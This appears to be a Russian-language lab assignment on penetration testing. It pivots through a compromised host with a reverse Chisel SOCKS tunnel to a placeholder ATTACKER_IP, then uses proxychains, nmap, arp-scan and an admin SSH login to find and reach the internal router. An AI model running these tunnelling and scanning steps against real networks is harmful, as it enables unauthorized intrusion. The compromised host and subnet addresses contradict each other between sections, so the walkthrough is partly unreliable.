
## Цель работы  
Освоить методы создания прокси-туннелей для доступа к защищенным сетевым сегментам и определения ключевых сетевых узлов (маршрутизаторов) во внутренней инфраструктуре.  

---

## Задачи работы  
- Организовать прокси-туннель через скомпрометированный хост (10.10.8.15) для доступа к внутренней сети.  
- Определить IP-адрес маршрутизатора (шлюза по умолчанию) в целевой подсети (10.10.8.0/24).  

---

## Теоретическая часть  

### 1. Прокси-туннелирование в пентестинге  
**Прокси-туннель** — метод перенаправления сетевого трафика через компрометированную систему для:  
- Обхода сетевых ограничений (фаерволы, ACL)  
- Сокрытия реального IP-адреса атакующего  
- Доступа к изолированным сетевым сегментам  

**Типы туннелей:**  
- **SOCKS-прокси (уровень приложений):**  
  - Позволяет проксировать TCP-соединения (HTTP, FTP, SMTP)  
  - Инструменты: `Chisel`, `SSH -D`, `proxychains`  
- **VPN-туннели (сетевой уровень):**  
  - Перенаправление всего трафика (TCP/IP)  
  - Инструменты: `pppd`, `OpenVPN`  

### 2. Идентификация сетевой инфраструктуры  
**Маршрутизатор (шлюз по умолчанию):**  
- Устройство, соединяющее разные сетевые сегменты  
- Его IP — точка входа/выхода для трафика подсети  

**Методы обнаружения:**  
1. Анализ таблицы маршрутизации:  
```bash
ip route show default
```
2. Просмотр ARP-кэша:  
```bash
arp -a | grep -i "gateway"
```
3. TTL-анализ через traceroute:  
```bash
traceroute 8.8.8.8
```

---

## Ход выполнения лабораторной работы  

### Шаг 1: Организация SOCKS-прокси через Chisel  
**Предпосылки:**  
- Доступ к хосту 10.10.8.15 через SSH/Meterpreter  

1. На атакующей машине (Kali):  
```bash
./chisel server -p 8080 --reverse
```
2. На цели (10.10.6.2):  
```bash
./chisel client ATTACKER_IP:8080 R:1080:socks
```
3. Настройка proxychains (`/etc/proxychains.conf`):  
```ini
socks5 127.0.0.1 1080
```

### Шаг 2: Обнаружение IP-адреса маршрутизатора  
1. Через прокси-туннель:  
```bash
proxychains nmap -sn 10.10.6.0/24
```
2. Анализ результатов:  
- Устройство с наименьшим TTL в traceroute  
- MAC-адрес с OUI производителя маршрутизаторов (MikroTik, Cisco)  
```bash
proxychains arp-scan 10.10.6.0/24
```
3. Подтверждение:  
```bash
proxychains curl ifconfig.me  # Внешний IP
proxychains ping 10.10.6.1    # Проверка доступности
```

### Шаг 3: Верификация через прямое подключение  
1. Использование обнаруженного IP (например, 10.10.8.1):  
```bash
proxychains ssh admin@10.10.8.1
```
2. Проверка таблицы маршрутизации на маршрутизаторе:  
```bash
show ip route
```

---

## Форма отчёта  
1. **Цель и задачи.**  
2. **Теория:** Принципы прокси-туннелирования и методы идентификации сетевых узлов.  
3. **Результаты:**  
   - Вывод `nmap -sn` с обнаруженными хостами  
   - Скриншот `arp-scan` с MAC-адресом маршрутизатора  
   - Подтверждающий вывод `traceroute`  
4. **Выводы:**  
   - Значение обнаруженного IP-адреса шлюза  
   - Оценка эффективности инструментов (Chisel vs SSH)  
   - Рекомендации по защите от туннелирования  

---

## Вопросы для самоконтроля  
1. Почему SOCKS-прокси эффективнее HTTP-прокси для пентеста?  
2. Как определить производителя устройства по MAC-адресу?  
3. Чем опасен доступ к маршрутизатору внутренней сети?  
4. Как обнаружить нелегитимные туннели в корпоративной сети?  
5. Почему `arp-scan` часто эффективнее `ping` для обнаружения хостов?  
